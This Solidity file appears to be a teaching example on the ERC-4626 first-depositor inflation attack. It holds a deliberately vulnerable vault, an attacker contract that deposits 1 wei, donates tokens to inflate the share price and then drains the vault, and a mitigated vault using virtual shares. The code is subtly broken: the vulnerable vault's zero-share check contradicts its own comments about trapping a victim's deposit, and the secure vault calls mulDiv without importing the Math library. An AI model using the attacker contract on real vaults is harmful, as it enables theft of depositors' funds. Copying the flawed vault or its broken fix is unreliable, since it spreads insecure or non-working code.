// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC4626.sol";

/// @title InflationAttackVault - Vulnerable ERC-4626 implementation
/// @notice Susceptible to first depositor inflation attack
/// @dev DO NOT USE IN PRODUCTION

contract SimpleERC20 is ERC20 {
    constructor() ERC20("Test Token", "TEST") {
        _mint(msg.sender, 1000000 * 10**18);
    }

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

/// @title VulnerableVault - ERC-4626 with inflation vulnerability
/// @notice Missing virtual shares/assets protection
contract VulnerableVault is ERC4626 {
    constructor(IERC20 asset) ERC4626(asset) ERC20("Vault Shares", "vTEST") {}

    /// @notice VULNERABLE: No minimum shares check
    /// @dev Allows share price manipulation via donation
    function deposit(uint256 assets, address receiver)
        public
        override
        returns (uint256 shares)
    {
        shares = previewDeposit(assets);

        // VULNERABILITY: Can return 0 shares for small deposits
        // after attacker manipulates exchange rate
        require(shares > 0, "Zero shares");

        _deposit(_msgSender(), receiver, assets, shares);
    }
}

/// @title InflationAttacker - Exploits ERC-4626 rounding
/// @notice Performs inflation attack to steal deposits
contract InflationAttacker {
    VulnerableVault public vault;
    IERC20 public asset;

    constructor(address _vault) {
        vault = VulnerableVault(_vault);
        asset = IERC20(vault.asset());
    }

    /// @notice Execute inflation attack
    /// @dev Steps:
    /// 1. Deposit 1 wei to get 1 share
    /// 2. Donate large amount directly to vault
    /// 3. Next depositor gets rounded down to 0 shares
    /// 4. Withdraw and profit
    function attack() external {
        // Step 1: Become first depositor with minimal amount
        asset.approve(address(vault), type(uint256).max);
        uint256 shares = vault.deposit(1, address(this));
        require(shares == 1, "Should get 1 share");

        // Step 2: Donate large amount to inflate share price
        // This bypasses deposit() and doesn't mint shares
        uint256 donationAmount = 10000 * 10**18;
        asset.transfer(address(vault), donationAmount);

        // Now: totalAssets = 10000e18 + 1
        //      totalSupply = 1
        //      1 share = ~10000e18 assets

        // Step 3: Wait for victim to deposit
        // If victim deposits < 10000e18, they get 0 shares!
        // Their assets are trapped and belong to attacker

        // Step 4: Redeem share for inflated value
        // vault.redeem(1, address(this), address(this));
    }

    /// @notice Victim attempts deposit
    /// @dev Will receive 0 shares due to rounding
    function victimDeposit(uint256 amount) external {
        asset.transferFrom(msg.sender, address(this), amount);
        asset.approve(address(vault), amount);

        uint256 shares = vault.deposit(amount, msg.sender);
        // shares will be 0 if amount < totalAssets
        // Victim loses funds!
    }

    /// @notice Attacker redeems inflated shares
    function drain() external {
        uint256 shares = vault.balanceOf(address(this));
        vault.redeem(shares, msg.sender, address(this));
    }
}

/// @title SecureVault - Mitigated ERC-4626
/// @notice Implements defenses against inflation attack
contract SecureVault is ERC4626 {
    uint256 private constant VIRTUAL_SHARES = 1e3;
    uint256 private constant VIRTUAL_ASSETS = 1;

    constructor(IERC20 asset) ERC4626(asset) ERC20("Secure Vault", "svTEST") {}

    /// @notice SECURE: Virtual shares prevent inflation
    function _convertToShares(uint256 assets, Math.Rounding rounding)
        internal
        view
        virtual
        override
        returns (uint256)
    {
        uint256 supply = totalSupply() + VIRTUAL_SHARES;
        uint256 totalAssets = totalAssets() + VIRTUAL_ASSETS;

        return assets.mulDiv(supply, totalAssets, rounding);
    }

    function _convertToAssets(uint256 shares, Math.Rounding rounding)
        internal
        view
        virtual
        override
        returns (uint256)
    {
        uint256 supply = totalSupply() + VIRTUAL_SHARES;
        uint256 totalAssets = totalAssets() + VIRTUAL_ASSETS;

        return shares.mulDiv(totalAssets, supply, rounding);
    }

    /// @notice Minimum shares check
    function deposit(uint256 assets, address receiver)
        public
        override
        returns (uint256 shares)
    {
        shares = previewDeposit(assets);
        require(shares >= 1e3, "Minimum 1000 shares required");
        _deposit(_msgSender(), receiver, assets, shares);
    }
}
